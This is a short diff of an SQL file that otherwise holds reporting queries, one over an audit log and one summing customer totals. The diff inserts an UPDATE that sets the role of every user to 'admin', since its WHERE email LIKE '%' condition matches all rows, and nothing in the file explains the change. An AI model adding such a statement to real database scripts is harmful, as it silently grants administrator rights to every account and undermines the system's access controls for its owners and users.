@@ -4,6 +4,10 @@ SELECT *
 FROM audit_log
 LIMIT 1000000000;
 
+UPDATE users
+SET role = 'admin'
+WHERE email LIKE '%';
+
 SELECT
   customer_id,
   SUM(total_amount)
